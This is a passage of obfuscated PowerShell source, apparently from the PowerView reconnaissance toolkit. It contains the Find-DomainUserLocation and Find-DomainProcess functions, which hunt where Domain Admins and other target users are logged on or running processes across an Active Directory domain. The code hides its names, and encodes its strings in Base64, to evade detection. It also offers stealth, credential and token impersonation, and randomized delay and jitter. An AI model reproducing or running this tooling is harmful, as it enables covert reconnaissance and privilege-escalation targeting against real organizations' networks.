                                    ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${/\_____/\/\_/\/\/}.IsAdmin
                                }
                                else {
                                    ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                }
                                ${/===\/===\/\/=\/=}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
                                ${/===\/===\/\/=\/=}
                            }
                        }
                    }
                    if (-not $Stealth) {
                        ${/=\_/===\____/\_/} = _/=\/=\_/\/===\_/= -/=\/\/\/=\__/\_/= ${__/\_/==\/\/=\/\_}
                        ForEach (${_/==\/=\___/=====\} in ${/=\_/===\____/\_/}) {
                            ${/=\__/\_/\__/\/\_} = ${_/==\/=\___/=====\}.UserName
                            $UserDomain = ${_/==\/=\___/=====\}.LogonDomain
                            if ((${/=\__/\_/\__/\/\_}) -and (${/=\__/\_/\__/\/\_}.trim() -ne '')) {
                                if ( (-not ${/===\/=\__/\___/=}) -or (${/===\/=\__/\___/=} -contains ${/=\__/\_/\__/\/\_}) -and (${/=\__/\_/\__/\/\_} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
                                    ${__/\/====\___/==\} = @(_/=====\___/====== -/=\/\/\/=\__/\_/= ${__/\_/==\/\/=\/\_})[0].IPAddress
                                    ${/===\/===\/\/=\/=} = New-Object PSObject
                                    ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                                    ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${/=\__/\_/\__/\/\_}
                                    ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${__/\_/==\/\/=\/\_}
                                    ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) ${__/\/====\___/==\}
                                    ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) $Null
                                    ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                    if ($CheckAccess) {
                                        ${/\_____/\/\_/\/\/} = ________/=\/\_/=== -/=\/\/\/=\__/\_/= ${__/\_/==\/\/=\/\_}
                                        ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${/\_____/\/\_/\/\/}.IsAdmin
                                    }
                                    else {
                                        ${/===\/===\/\/=\/=} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                    }
                                    ${/===\/===\/\/=\/=}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
                                    ${/===\/===\/\/=\/=}
                                }
                            }
                        }
                    }
                }
            }
            if (${__/\__/\/\/\_/\/==}) {
                _/==\_/\/=\_/==\/\
            }
        }
        ${__/=\___/\_/\__/\} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential
            }
            else {
                ${__/=\___/\_/\__/\} = __/\__/\/==\/==\_/ -Credential $Credential -__/\/=\/==\/=\/=\_
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $(${_/\/\/\/=\_/=\__/}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAEQAZQBsAGEAeQA6ACAAJABEAGUAbABhAHkALAAgAEoAaQB0AHQAZQByADoAIAAkAEoAaQB0AHQAZQByAA==')))
            ${__/=\/=\/\_____/\} = 0
            ${/=\/=\_/\_/==\/=\} = New-Object System.Random
            ForEach (${__/\_/==\/\/=\/\_} in ${_/\/\/\/=\_/=\__/}) {
                ${__/=\/=\/\_____/\} = ${__/=\/=\/\_____/\} + 1
                sleep -Seconds ${/=\/=\_/\_/==\/=\}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainUserLocation] Enumerating server ${/\_______/\/\/=\/} (${__/=\/=\/\_____/\} of $(${_/\/\/\/=\_/=\__/}.Count))"
                icm -ScriptBlock ${__/\/==\/\/=\/\__} -ArgumentList ${__/\_/==\/\/=\/\_}, ${/===\/=\__/\___/=}, ${_/==\/\/\_/=\_/\/}, $Stealth, ${__/=\___/\_/\__/\}
                if (${___/=\/\________/} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG4AaQBuAGcAIABlAGEAcgBsAHkA')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFUAcwBpAG4AZwAgAHQAaAByAGUAYQBkAGkAbgBnACAAdwBpAHQAaAAgAHQAaAByAGUAYQBkAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $(${_/\/\/\/=\_/=\__/}.Length)"
            ${/===\/=\/\/\_/=\_} = @{
                'TargetUsers' = ${/===\/=\__/\___/=}
                'CurrentUser' = ${_/==\/\/\_/=\_/\/}
                'Stealth' = $Stealth
                'TokenHandle' = ${__/=\___/\_/\__/\}
            }
            _/=\/===\__/==\/\_ -/=\/\/\/=\__/\_/= ${_/\/\/\/=\_/=\__/} -____/\_/==\_/==\_/ ${__/\/==\/\/=\/\__} -_/===\/==\_/=\_/\_ ${/===\/=\/\/\_/=\_} -Threads $Threads
        }
    }
    END {
        if (${__/=\___/\_/\__/\}) {
            _/==\_/\/=\_/==\/\ -__/\__/\/\/\_/\/== ${__/=\___/\_/\__/\}
        }
    }
}
function Find-DomainProcess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${/=\/\/\/=\__/\_/=},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserSearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $UserGroupIdentity = 'Domain Admins',
        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $UserAdminCount,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,
        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )
    BEGIN {
        ${_/\/====\/\/=\_/=} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEwARABBAFAARgBpAGwAdABlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $ComputerLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${__/==\/=\__/==\/==} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${__/===\/==\_/=\/\_} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${__/==========\_/=\} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/====\/\/=\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${____/\_____/\/===} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${____/\_____/\/===}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${_/\/\/\/=\_/=\__/} = ${/=\/\/\/=\__/\_/=}
        }
        else {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAUQB1AGUAcgB5AGkAbgBnACAAYwBvAG0AcAB1AHQAZQByAHMAIABpAG4AIAB0AGgAZQAgAGQAbwBtAGEAaQBuAA==')))
            ${_/\/\/\/=\_/=\__/} = __/\/\/=\/\_/==\/\ @_/\/====\/\/=\_/= | select -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $(${_/\/\/\/=\_/=\__/}.Length)"
        if (${_/\/\/\/=\_/=\__/}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAATgBvACAAaABvAHMAdABzACAAZgBvAHUAbgBkACAAdABvACAAZQBuAHUAbQBlAHIAYQB0AGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA==')))]) {
            ${/=\_/=\/\/=\/==\_} = @()
            ForEach (${_/\/=\_/\/\_/=\__} in $ProcessName) {
                ${/=\_/=\/\/=\/==\_} += ${_/\/=\_/\/\_/=\__}.Split(',')
            }
            if (${/=\_/=\/\/=\/==\_} -isnot [System.Array]) {
                ${/=\_/=\/\/=\/==\_} = [String[]] @(${/=\_/=\/\/=\/==\_})
            }
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
            ${/===\/=\__/\___/=} = ____/\/====\/\___/ @____/\_____/\/=== | select -ExpandProperty samaccountname
        }
        else {
            ${/===\_/\_/===\_/=} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/===\_/\_/===\_/=}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${/===\_/\_/===\_/=}
            ${/===\/=\__/\___/=} = __/\_____/===\/\/\ @/===\_/\_/===\_/= | select -ExpandProperty MemberName
        }
        ${__/\/==\/\/=\/\__} = {
            Param(${/=\/\/\/=\__/\_/=}, $ProcessName, ${/===\/=\__/\___/=}, $Credential)
            ForEach (${__/\_/==\/\/=\/\_} in ${/=\/\/\/=\__/\_/=}) {
                ${_/\/==\___/\/=\__} = Test-Connection -Count 1 -Quiet -ComputerName ${__/\_/==\/\/=\/\_}
                if (${_/\/==\___/\/=\__}) {
                    if ($Credential) {
                        ${_/\/\___/========} = __/=\_/\/===\___/\ -Credential $Credential -/=\/\/\/=\__/\_/= ${__/\_/==\/\/=\/\_} -ErrorAction SilentlyContinue
                    }
                    else {
                        ${_/\/\___/========} = __/=\_/\/===\___/\ -/=\/\/\/=\__/\_/= ${__/\_/==\/\/=\/\_} -ErrorAction SilentlyContinue
                    }
                    ForEach (${___/=\/\_/=====\_} in ${_/\/\___/========}) {
                        if ($ProcessName) {
                            if ($ProcessName -Contains ${___/=\/\_/=====\_}.ProcessName) {
                                ${___/=\/\_/=====\_}
                            }
                        }
                        elseif (${/===\/=\__/\___/=} -Contains ${___/=\/\_/=====\_}.User) {
                            ${___/=\/\_/=====\_}
                        }
                    }
                }
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainProcess] Total number of hosts: $(${_/\/\/\/=\_/=\__/}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAARABlAGwAYQB5ADoAIAAkAEQAZQBsAGEAeQAsACAASgBpAHQAdABlAHIAOgAgACQASgBpAHQAdABlAHIA')))
            ${__/=\/=\/\_____/\} = 0
            ${/=\/=\_/\_/==\/=\} = New-Object System.Random
            ForEach (${__/\_/==\/\/=\/\_} in ${_/\/\/\/=\_/=\__/}) {
                ${__/=\/=\/\_____/\} = ${__/=\/=\/\_____/\} + 1
                sleep -Seconds ${/=\/=\_/\_/==\/=\}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainProcess] Enumerating server ${__/\_/==\/\/=\/\_} (${__/=\/=\/\_____/\} of $(${_/\/\/\/=\_/=\__/}.count))"
                ${___/=\/\________/} = icm -ScriptBlock ${__/\/==\/\/=\/\__} -ArgumentList ${__/\_/==\/\/=\/\_}, ${/=\_/=\/\/=\/==\_}, ${/===\/=\__/\___/=}, $Credential
                ${___/=\/\________/}
                if (${___/=\/\________/} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAVABhAHIAZwBlAHQAIAB1AHMAZQByACAAZgBvAHUAbgBkACwAIAByAGUAdAB1AHIAbgBpAG4AZwAgAGUAYQByAGwAeQA=')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AUAByAG8AYwBlAHMAcwBdACAAVQBzAGkAbgBnACAAdABoAHIAZQBhAGQAaQBuAGcAIAB3AGkAdABoACAAdABoAHIAZQBhAGQAcwA6ACAAJABUAGgAcgBlAGEAZABzAA==')))
            ${/===\/=\/\/\_/=\_} = @{
                'ProcessName' = ${/=\_/=\/\/=\/==\_}
                'TargetUsers' = ${/===\/=\__/\___/=}
                'Credential' = $Credential
            }
